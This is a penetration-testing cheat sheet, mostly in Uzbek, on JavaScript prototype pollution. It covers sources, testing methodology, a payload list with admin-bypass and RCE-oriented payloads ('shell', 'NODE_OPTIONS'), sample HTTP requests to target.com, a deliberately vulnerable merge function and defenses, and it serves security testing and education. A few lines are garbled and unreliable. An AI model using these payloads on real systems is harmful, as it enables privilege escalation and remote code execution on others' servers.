# Prototype Pollution

## 1. Ta'rif
Prototype pollution — JavaScript obyektining `__proto__`, `constructor.prototype`, `prototype` kalitlari orqali `Object.prototype` ni zaharlash. Keyin bu "global" zaharlangan kalitlar app kodi tomonidan ishlatilsa → RCE (Jinja2? yo'q — Node), XSS, bypass, DoS.

## 2. Qayerdan kelib chiqadi
- `merge()`, `extend()`, `clone()` (lodash? `_.merge` history CVE), `deepmerge`, jQuery `.extend`
- JSON parse → tarmoqli kalit kiritish: `{"__proto__": {...}}`
- Express qayerda `req.query` → `{__proto__:{...}}`
- Function: `function merge(a,b){for(k in b) a[k]=b[k]}`
- URL parsing, qs`@CVE`, `merge-deep`, `moment`, minimist

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| Client-side | browser XSS — pollute → sink (innerHTML/innerText) |
| Server-side | Node — pollute → RCE/ETC |
| Via `__proto__` | direct key |
| Via `constructor.prototype` | nested |
| Library | `lodash.merge`, `qs`, `flat`, `YAML` |

## 4. Metodologiya
1. Endpoint JSON body: `{"__proto__":{"polluted":true}}` — response/reflection'da ko'rinadimi.
   ```
   POST /api/user {"name":"x","__proto__":{"isAdmin":true}}
   ```
2. Aniqlang: `{"constructor":{"prototype":{"polluted":"yes"}}}`.
3. Server-side sinash — `JSON.stringify` bo'lsa refleksiya va keyin app'da ishlatish:
   - `{"__proto__": {"exec": "..."}}` — `child_process` chain
   - `{"__proto__": {"shell": "/proc/self/exe", "argv0": ...}}` → RCE (Node CVE)
4. Client-side: app `innerHTML`/`location` da ishlatiladigan keylarni pollution orqali o'zgartirish.
5. Library versionlarini CVE'dan tekshirish:
   - `qs` (CVE-2017-1000616, prototype pollution), `lodash` merge, `yargs`, `json5`
6. Agent-YAML bo'lsa — `a: !!js/function ...` unlock

## 5. Payload'lar
```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"__proto__": {"isAdmin": true, "shell": "/bin/sh", "NODE_OPTIONS": "--require /proc/self/environ"}}
[{"__proto__": {"polluted": "yes"}}]
{"a": {"__proto__": {"__proto__": {"polluted": true}}}}
{"__proto__": {"toString": "polluted"}}

# qs query string
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
# URL? ``?a[__proto__][b]=yes` — object collider
```
## 6. Request misollari
```
POST /api/order HTTP/1.1
Host: target.com
Content-Type: application/json

{"item": "x", "__proto__": {"isAdmin": true}}

GET /?__proto__[winner]=hax HTTP/1.1
```
## 7. Zaif code misollari
```javascript
// ZAIF merge
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (isObject(source[key])) merge(target[key], source[key]);
    else target[key] = source[key];
  }
}
merge(config, req.body);  // req.body {"__proto__":{...}} → global pollute

// XAVFSIZ: Object.keys + skip __proto__/constructor, Object.create(null), deep-freeze, flat:tab
// yoki yetilgan saga... use lodash.mergeWith  w/ guard
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] JSON/query body'ga `__proto__`/`constructor.prototype` qo'shing
- [ ] Server-side`de: application'da qaysi key` ishlatiladi (path, options, headers) → RCE yo'l
- [ ] Library CVE (lodash/qs/minimist/yargs) — version
- [ ] Client-side: sink `innerHTML`, `location`, `document.cookie` 
- [ ] Multi-level: `{"__proto__": {"__proto__": ...}}` nested merge
- [ ] `JSON.parse` dan to`gi`ri ma'lumot emas — merge/extend/assign foydalaniladimi
- [ ] Admin check `user.admin` — pollute qilinsа `admin` → bypass
## 9. Himoya
- `Object.create(null)` maps, freeze prototypes
- Skip/del __proto__ & constructor keys in merge
- Use JSON schema validation deny `__proto__`; `eslint no-__proto__`
- CSPRNG / least-priv, server-side framework updates